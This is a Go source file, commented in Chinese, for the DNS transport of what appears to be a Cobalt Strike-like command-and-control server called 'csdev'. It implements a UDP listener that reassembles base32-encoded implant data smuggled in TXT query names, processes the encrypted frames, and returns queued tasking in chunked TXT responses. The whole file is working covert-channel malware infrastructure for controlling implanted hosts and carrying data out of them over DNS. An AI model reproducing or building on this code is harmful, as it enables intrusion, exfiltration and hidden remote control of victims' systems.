// csdev :: dns_listener.go  --  DNS listener (协议 v2 的第四种承载层)
//
// 与 HTTP/TCP/SMB 共用 v2ProcessFrame —— 加密、TLV、任务批次完全一致,
// 差别只在承载层: 数据经 DNS 查询/应答搬运。
//
// 线格式 (务实简化版):
//
//	上行查询:  <idx>.<total>.<b32chunk>.<sid>u.<domain>
//	下行查询:  <j>.<sid>g.<domain>
//	应答:      TXT 记录, 内容 = [1B 标志][数据]
//	           标志 0x00 = 分片数据(此处 data 为原始字节, 不再二次编码);
//	           标志 0x01 = 无更多数据
//
// 带宽约束 (必须知道, 不是缺陷):
//	一个查询最多携带约 125 字节。**DNS 通道只适合指令与文本结果, 不适合大文件**;
//	单帧上限 dnsMaxFrame, 超限会被拒绝并记日志。这与 CS 的 DNS beacon 定位一致。
//
// 用法: csdev-server.exe --dns 0.0.0.0:5353   (生产用 53 需管理员/root)
// 植入体: -DC2_TRANSPORT_DNS=1 -DC2_HOST=<ip> -DC2_PORT=5353
package main

import (
	"crypto/rsa"
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	dnsMaxChunk      = 200               // 每查询携带的 base32 字符数 (5 bit/字符 -> 125 字节)
	dnsMaxFrame      = 256 * 1024        // 单帧上限
	dnsAssemblyTTL   = 30 * time.Second
	dnsMaxAssemblies = 64
	dnsMaxChunks     = 4096 // 单帧分片数上限 (保护)
)

var dnsB32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// ---------------------------------------------------------------- 分片组装

type dnsAssembly struct {
	total int
	parts [][]byte
	got   int
	at    time.Time
}

type DNSListener struct {
	Name string
	Addr string
	Priv *rsa.PrivateKey

	mu        sync.Mutex
	conn      *net.UDPConn
	up        map[string]*dnsAssembly // sid -> 上行分片
	down      map[string][]byte       // sid -> 待下行数据
	downOff   map[string]int
	frames    uint64
	chunksIn  uint64
	chunksOut uint64
	rejected  uint64
	start     time.Time
	stopped   bool
}

func NewDNSListener(name, addr string, priv *rsa.PrivateKey) *DNSListener {
	return &DNSListener{
		Name: name, Addr: addr, Priv: priv,
		up:      map[string]*dnsAssembly{},
		down:    map[string][]byte{},
		downOff: map[string]int{},
		start:   time.Now(),
	}
}

func (l *DNSListener) Start() error {
	ua, err := net.ResolveUDPAddr("udp", l.Addr)
	if err != nil {
		return fmt.Errorf("地址解析失败: %w", err)
	}
	conn, err := net.ListenUDP("udp", ua)
	if err != nil {
		return err
	}
	l.mu.Lock()
	l.conn = conn
	l.mu.Unlock()
	go l.readLoop(conn)
	go l.gcLoop()
	return nil
}

func (l *DNSListener) Stop() {
	l.mu.Lock()
	l.stopped = true
	c := l.conn
	l.mu.Unlock()
	if c != nil {
		c.Close() // 关掉 UDP socket, 端口随之释放
	}
}

// sock 取当前 UDP socket (并发安全)。返回 nil 表示已经关掉。
func (l *DNSListener) sock() *net.UDPConn {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.conn
}

// boundAddr 返回内核实际绑定的地址 (Addr 里写 0 端口时用它拿真实端口)。
func (l *DNSListener) boundAddr() string {
	c := l.sock()
	if c != nil {
		if ua, ok := c.LocalAddr().(*net.UDPAddr); ok {
			return net.JoinHostPort(ua.IP.String(), strconv.Itoa(ua.Port))
		}
		return c.LocalAddr().String()
	}
	return l.Addr
}

func (l *DNSListener) readLoop(conn *net.UDPConn) {
	buf := make([]byte, 4096)
	for {
		n, addr, err := conn.ReadFromUDP(buf)
		if err != nil {
			l.mu.Lock()
			stop := l.stopped
			l.mu.Unlock()
			if stop {
				return
			}
			time.Sleep(50 * time.Millisecond)
			continue
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		l.handle(pkt, addr)
	}
}

func (l *DNSListener) gcLoop() {
	for {
		time.Sleep(10 * time.Second)
		l.mu.Lock()
		if l.stopped {
			l.mu.Unlock()
			return
		}
		cut := time.Now().Add(-dnsAssemblyTTL)
		for k, as := range l.up {
			if as.at.Before(cut) {
				delete(l.up, k)
			}
		}
		l.mu.Unlock()
	}
}

// handle 处理一个 DNS 查询
func (l *DNSListener) handle(pkt []byte, addr *net.UDPAddr) {
	qname, qtype, ok := dnsParseQuery(pkt)
	if !ok {
		l.reject("报文解析失败")
		return
	}

	// 启动初期的少量查询打出来, 便于排查植入体侧构造问题
	l.mu.Lock()
	verbose := l.chunksIn < 24
	l.mu.Unlock()
	if verbose {
		logf("[dns] 查询 qname=%q qtype=%d from=%s", qname, qtype, addr.String())
	}

	// 只处理 TXT 查询 (植入体固定用 TXT)
	if qtype != 16 {
		l.reject(fmt.Sprintf("非 TXT 查询 qtype=%d", qtype))
		return
	}

	kind, sid, idx, total, data, err := dnsDecodeName(qname)
	if err != nil {
		l.reject("域名解析失败: " + err.Error() + " qname=" + qname)
		return
	}

	switch kind {
	case 'u':
		l.handleUpload(pkt, addr, sid, idx, total, data)
	case 'g':
		l.handleDownload(pkt, addr, sid, idx)
	}
}

func (l *DNSListener) handleUpload(pkt []byte, addr *net.UDPAddr, sid string, idx, total int, data []byte) {
	if total <= 0 || total > dnsMaxChunks || idx < 0 || idx >= total {
		l.reject(fmt.Sprintf("分片参数非法 idx=%d total=%d", idx, total))
		return
	}

	l.mu.Lock()
	if len(l.up) >= dnsMaxAssemblies {
		// 淘汰最旧的
		var oldestKey string
		var oldest time.Time
		for k, v := range l.up {
			if oldestKey == "" || v.at.Before(oldest) {
				oldestKey, oldest = k, v.at
			}
		}
		delete(l.up, oldestKey)
	}
	as := l.up[sid]
	if as == nil || as.total != total {
		as = &dnsAssembly{total: total, parts: make([][]byte, total)}
		l.up[sid] = as
	}
	as.at = time.Now()
	if as.parts[idx] == nil {
		as.parts[idx] = data
		as.got++
	}
	l.chunksIn++

	if as.got < as.total {
		l.mu.Unlock()
		// 未收齐: 回一个"继续"标志
		txt := []byte{0x01}
		l.reply(pkt, addr, txt)
		return
	}

	// 组装完整帧
	frame := []byte{}
	for i := 0; i < as.total; i++ {
		frame = append(frame, as.parts[i]...)
	}
	delete(l.up, sid)
	l.frames++
	l.mu.Unlock()

	if len(frame) == 0 || len(frame) > dnsMaxFrame {
		l.reject(fmt.Sprintf("帧长度非法 %d", len(frame)))
		l.reply(pkt, addr, []byte{0x02})
		return
	}

	resp := v2ProcessFrame(frame, addr.String(), l.Priv)

	l.mu.Lock()
	if resp == nil {
		delete(l.down, sid)
		delete(l.downOff, sid)
	} else {
		l.down[sid] = resp
		l.downOff[sid] = 0
	}
	l.mu.Unlock()

	txt := []byte{0x01} // 上传已接收
	l.reply(pkt, addr, txt)
}

func (l *DNSListener) handleDownload(pkt []byte, addr *net.UDPAddr, sid string, idx int) {
	l.mu.Lock()
	buf, ok := l.down[sid]
	off := l.downOff[sid]
	l.mu.Unlock()

	if !ok || off >= len(buf) {
		l.reply(pkt, addr, []byte{0x01}) // 无更多数据
		return
	}

	// 每片承载 dnsMaxChunk*5/8 字节左右
	maxBytes := dnsMaxChunk * 5 / 8
	end := off + maxBytes
	if end > len(buf) {
		end = len(buf)
	}
	chunk := buf[off:end]

	l.mu.Lock()
	l.downOff[sid] = end
	if end >= len(buf) {
		delete(l.down, sid)
		delete(l.downOff, sid)
	}
	l.chunksOut++
	l.mu.Unlock()

	payload := make([]byte, 0, 1+len(chunk))
	payload = append(payload, 0x00)
	payload = append(payload, chunk...)
	l.reply(pkt, addr, payload)
}

func (l *DNSListener) reply(query []byte, addr *net.UDPAddr, txt []byte) {
	resp := dnsBuildTXTResponse(query, txt)
	if len(resp) > 512 {
		// 超过传统 UDP DNS 限制, 截断到安全长度 (客户端按标志位处理)
		resp = resp[:512]
	}
	c := l.sock()
	if c == nil {
		l.reject("应答发送失败: socket 已关闭")
		return
	}
	if _, err := c.WriteToUDP(resp, addr); err != nil {
		l.reject("应答发送失败: " + err.Error())
	}
}

func (l *DNSListener) reject(reason string) {
	l.mu.Lock()
	l.rejected++
	n := l.rejected
	l.mu.Unlock()
	if n <= 20 || n%100 == 0 {
		logf("[dns] 拒绝: %s (累计 %d)", reason, n)
	}
}

// ---------------------------------------------------------------- DNS 报文

func dnsParseQuery(pkt []byte) (string, uint16, bool) {
	if len(pkt) < 12 {
		return "", 0, false
	}
	flags := binary.BigEndian.Uint16(pkt[2:4])
	if flags&0x8000 != 0 {
		return "", 0, false // QR=1 是应答
	}
	if binary.BigEndian.Uint16(pkt[4:6]) == 0 {
		return "", 0, false
	}

	var labels []string
	off := 12
	for off < len(pkt) {
		l := int(pkt[off])
		if l == 0 {
			off++
			break
		}
		if l&0xC0 == 0xC0 {
			return "", 0, false
		}
		if off+1+l > len(pkt) {
			return "", 0, false
		}
		labels = append(labels, string(pkt[off+1:off+1+l]))
		off += 1 + l
	}
	if off+4 > len(pkt) {
		return "", 0, false
	}
	qtype := binary.BigEndian.Uint16(pkt[off : off+2])
	return strings.Join(labels, "."), qtype, true
}

func dnsBuildTXTResponse(query []byte, txt []byte) []byte {
	if len(txt) > 250 {
		txt = txt[:250]
	}
	out := make([]byte, 0, 256+len(txt))

	hdr := make([]byte, 12)
	if len(query) >= 2 {
		binary.BigEndian.PutUint16(hdr[0:2], binary.BigEndian.Uint16(query[0:2]))
	}
	hdr[2] = 0x81 // QR=1, RD=1
	hdr[3] = 0x80 // RA=1, RCODE=0
	binary.BigEndian.PutUint16(hdr[4:6], 1)
	binary.BigEndian.PutUint16(hdr[6:8], 1)
	out = append(out, hdr...)

	// Question 原样回抄
	qend := 12
	for qend < len(query) && query[qend] != 0 {
		qend += 1 + int(query[qend])
	}
	qend += 1 + 4
	if qend > len(query) {
		qend = len(query)
	}
	if qend > 12 {
		out = append(out, query[12:qend]...)
	}

	// Answer: 名字指针 + TXT
	out = append(out, 0xC0, 0x0C)
	t := make([]byte, 10)
	binary.BigEndian.PutUint16(t[0:2], 16)
	binary.BigEndian.PutUint16(t[2:4], 1)
	binary.BigEndian.PutUint32(t[4:8], 30)
	binary.BigEndian.PutUint16(t[8:10], uint16(len(txt)+1))
	out = append(out, t...)
	out = append(out, byte(len(txt)))
	out = append(out, txt...)
	return out
}

func dnsExtractTXT(pkt []byte) ([]byte, bool) {
	if len(pkt) < 12 {
		return nil, false
	}
	if binary.BigEndian.Uint16(pkt[6:8]) == 0 {
		return nil, false
	}
	off := 12
	qd := binary.BigEndian.Uint16(pkt[4:6])
	for i := 0; i < int(qd); i++ {
		for off < len(pkt) && pkt[off] != 0 {
			if pkt[off]&0xC0 == 0xC0 {
				off++
				break
			}
			off += 1 + int(pkt[off])
		}
		off += 1 + 4
	}
	if off >= len(pkt) {
		return nil, false
	}
	if pkt[off]&0xC0 == 0xC0 {
		off += 2
	} else {
		for off < len(pkt) && pkt[off] != 0 {
			off += 1 + int(pkt[off])
		}
		off++
	}
	if off+10 > len(pkt) {
		return nil, false
	}
	rdlen := int(binary.BigEndian.Uint16(pkt[off+8 : off+10]))
	off += 10
	if off+rdlen > len(pkt) || rdlen < 1 {
		return nil, false
	}
	n := int(pkt[off])
	if off+1+n > len(pkt) {
		return nil, false
	}
	return pkt[off+1 : off+1+n], true
}

// dnsDecodeName 解析本项目的域名约定
func dnsDecodeName(qname string) (byte, string, int, int, []byte, error) {
	labels := strings.Split(qname, ".")
	if len(labels) < 2 {
		return 0, "", 0, 0, nil, fmt.Errorf("标签不足")
	}

	// 从后往前找 kind 标签, 并要求其**后一个标签必须是 "d"**。
	// 不能从前往后找第一个以 u/g 结尾的标签: base32 字母表含 'U'/'G',
	// 数据分段完全可能以它们结尾, 会被误判 (实测踩过)。
	kindIdx := -1
	var kind byte
	var sid string
	for i := len(labels) - 1; i >= 0; i-- {
		l := labels[i]
		if len(l) < 2 {
			continue
		}
		if i+1 >= len(labels) || labels[i+1] != "d" {
			continue
		}
		c := l[len(l)-1]
		if c == 'u' || c == 'U' {
			kind, kindIdx, sid = 'u', i, l[:len(l)-1]
			break
		}
		if c == 'g' || c == 'G' {
			kind, kindIdx, sid = 'g', i, l[:len(l)-1]
			break
		}
	}
	if kindIdx < 0 {
		return 0, "", 0, 0, nil, fmt.Errorf("缺少 u/g 标记")
	}
	if sid == "" || len(sid) > 12 {
		return 0, "", 0, 0, nil, fmt.Errorf("sid 非法")
	}
	for _, c := range sid {
		if (c < '0' || c > '9') && (c < 'a' || c > 'z') && (c < 'A' || c > 'Z') {
			return 0, "", 0, 0, nil, fmt.Errorf("sid 含非法字符")
		}
	}

	if kind == 'u' {
		if kindIdx < 3 {
			return 0, "", 0, 0, nil, fmt.Errorf("上行标签不足")
		}
		idx := atoiSafe(labels[0])
		total := atoiSafe(labels[1])
		if total <= 0 || total > dnsMaxChunks {
			return 0, "", 0, 0, nil, fmt.Errorf("分片总数非法 %d", total)
		}
		// base32 数据跨多个标签 (单标签 DNS 上限 63 字节, 客户端按 60 切段)
		b32 := strings.ToUpper(strings.Join(labels[2:kindIdx], ""))
		if len(b32) > dnsMaxChunk+8 {
			return 0, "", 0, 0, nil, fmt.Errorf("分片过长 %d", len(b32))
		}
		data, err := dnsB32.DecodeString(b32)
		if err != nil {
			return 0, "", 0, 0, nil, fmt.Errorf("base32 解码失败")
		}
		return kind, sid, idx, total, data, nil
	}

	j := atoiSafe(labels[0])
	return kind, sid, j, 0, nil, nil
}

func atoiSafe(s string) int {
	n := 0
	for i := 0; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			return -1
		}
		n = n*10 + int(s[i]-'0')
		if n > 1<<24 {
			return -1
		}
	}
	return n
}

// dnsEncodeChunks 把数据切成 base32 分片 (供测试与文档示例使用)
func dnsEncodeChunks(data []byte) []string {
	enc := dnsB32.EncodeToString(data)
	out := []string{}
	for i := 0; i < len(enc); i += dnsMaxChunk {
		end := i + dnsMaxChunk
		if end > len(enc) {
			end = len(enc)
		}
		out = append(out, enc[i:end])
	}
	if len(out) == 0 {
		out = append(out, "")
	}
	return out
}

// ---------------------------------------------------------------- 接线

var gDNSListeners []*DNSListener

func startDNSListener(spec string, priv *rsa.PrivateKey) error {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return nil
	}
	name := "csdev-dns"
	l := NewDNSListener(name, spec, priv)
	if err := l.Start(); err != nil {
		return err
	}
	gDNSListeners = append(gDNSListeners, l)

	host, portStr, _ := net.SplitHostPort(spec)
	host = strings.TrimSpace(host)
	port := atoiSafe(portStr)
	if port <= 0 {
		port = 53
	}
	if host == "" {
		host = "0.0.0.0"
	}
	_ = host
	_ = port
	// 注册表登记与事件日志由 listener_add 路径统一完成 (见 listener_admin.go):
	// 参数启动 (--dns) 与 REST (/api/listener/add) 走的是同一条 Add。
	logf("  DNS 入口: %s  (TXT 查询承载, 单帧上限 %d KB, 不适合大文件)",
		spec, dnsMaxFrame/1024)
	return nil
}

func dnsListenerSummary() []map[string]interface{} {
	out := []map[string]interface{}{}
	for _, l := range gDNSListeners {
		l.mu.Lock()
		m := map[string]interface{}{
			"name":       l.Name,
			"addr":       l.Addr,
			"frames":     l.frames,
			"chunks_in":  l.chunksIn,
			"chunks_out": l.chunksOut,
			"rejected":   l.rejected,
			"uptime_ns":  time.Since(l.start).Nanoseconds(),
		}
		l.mu.Unlock()
		out = append(out, m)
	}
	return out
}
